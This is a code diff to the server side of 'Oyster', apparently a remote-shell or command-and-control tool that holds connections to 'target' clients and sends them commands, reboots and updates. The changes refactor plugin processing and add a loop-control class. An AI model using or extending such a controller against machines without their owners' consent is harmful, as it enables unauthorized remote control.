@@ -28,6 +28,11 @@ def safe_input(display_string):
     return x
 
 
+class LoopController(object):
+    def __init__(self):
+        self.should_break = False
+
+
 class Connection(object):
     """
     Manages a socket object.
@@ -402,7 +407,7 @@ class ConnectionManager(object):
         :return:
         """
 
-        return True if self.connections[address].send_command('server_shutdown?') == 'Y' else False
+        return True if self.connections[address].send_command('oyster server_shutdown?') == 'Y' else False
 
     def add_connection(self, connection, address):
         """
@@ -541,7 +546,7 @@ o       O o   O `Ooo.   O   OooO'  o
                     break
 
             print(
-                '\n< Listener Thread > {} ({}) connected...\n{}'.format(
+                '\n< Listener Thread > {} ({}) connected... >\n{}'.format(
                     address[0],
                     address[1],
                     'Oyster> '
@@ -691,6 +696,59 @@ o       O o   O `Ooo.   O   OooO'  o
 
         return plugin_list
 
+    def process_plugins(self, plugin_list, data):
+        """
+        Process plugins to see if the data should be intercepted.
+
+        :param plugin_list:
+        :param data:
+        :return:
+        """
+
+        def run_plugin(_module, _data):
+            """
+            Run the plugin in the given module.
+
+            :param _module:
+            :param _data:
+            :return:
+            """
+
+            print('\n< {} >\n'.format(_module.__name__))
+            try:
+                plugin = _module.Plugin()
+            except AttributeError:
+                return False
+
+            # Remove the invocation command from the rest of the data.
+            command = _data[invocation_length:]
+            _result = plugin.run(self, command)
+            _plugin_ran = True
+            print('\n< /{} >'.format(_module.__name__))
+            return _plugin_ran, _result
+
+        if plugin_list:
+            plugin_ran = False
+            result = False
+            for module in plugin_list:
+                results = False
+
+                invocation_length = len(module.Plugin.invocation)
+                invocation_type = type(module.Plugin.invocation)
+
+                if invocation_type == list or invocation_type == tuple:
+                    if data[:invocation_length] in module.Plugin.invocation:
+                        results = run_plugin(module, data)
+                elif data[:invocation_length] == module.Plugin.invocation:
+                    if module.Plugin.enabled or (hasattr(module.Plugin, 'required') and module.Plugin.required):
+                        results = run_plugin(module, data)
+
+                if not results:
+                    continue
+                plugin_ran, result = results
+
+            return plugin_ran, result
+
     def start_client_shell(self):
         """
         Open up a client shell using the current connection.
@@ -702,11 +760,16 @@ o       O o   O `Ooo.   O   OooO'  o
 
         self.connection_mgr.send_command('oyster getcwd')
         while True:
+            # Get the client IP to display in the input string along with the current working directory
             input_string = "<{}> {}".format(self.connection_mgr.send_command('get ip'), self.connection_mgr.cwd)
+            # If the connection was closed for some reason, return which will end the client shell.
             if self.connection_mgr.current_connection.status == 'CLOSED':
                 return
+
+            # Get a command from the user using the crafted input string.
             command = safe_input(input_string)
 
+            # Start processing commands.
             if command == 'quit' or command == 'exit':
                 print('Detaching from client...')
                 try:
@@ -720,19 +783,13 @@ o       O o   O `Ooo.   O   OooO'  o
                 self.connection_mgr.current_connection = None
                 break
 
-            if plugin_list:
-                plugin_ran = False
-                for module in plugin_list:
-                    invocation_length = len(module.Plugin.invocation)
-
-                    if command[:invocation_length] == module.Plugin.invocation and module.Plugin.enabled:
-                        plugin = module.Plugin()
-                        # Remove the invocation command from the rest of the data.
-                        command = command[invocation_length:]
-                        plugin.run(self, command)
-                        plugin_ran = True
-                if plugin_ran:
-                    continue
+            # # # # # # # PROCESS PLUGINS # # # # # # #
+            plugin_ran, loop_controller = self.process_plugins(plugin_list, command)
+            if plugin_ran:
+                if isinstance(loop_controller, LoopController):
+                    if loop_controller.should_break:
+                        break
+                continue
 
             # Reboot the target's client.py file remotely.
             if command == 'shell reboot':
@@ -770,19 +827,13 @@ o       O o   O `Ooo.   O   OooO'  o
                 print(self.connection_mgr)
                 continue
 
-            if plugin_list:
-                plugin_ran = False
-                for module in plugin_list:
-                    invocation_length = len(module.Plugin.invocation)
-
-                    if command[:invocation_length] == module.Plugin.invocation and module.Plugin.enabled:
-                        plugin = module.Plugin()
-                        # Remove the invocation command from the rest of the data.
-                        command = command[invocation_length:]
-                        plugin.run(self, command)
-                        plugin_ran = True
-                if plugin_ran:
-                    continue
+            # # # # # # # PROCESS PLUGINS # # # # # # #
+            plugin_ran, loop_controller = self.process_plugins(plugin_list, command)
+            if plugin_ran:
+                if isinstance(loop_controller, LoopController):
+                    if loop_controller.should_break:
+                        break
+                continue
 
             # Update all clients using the local update.py file.
             if command == 'update all':
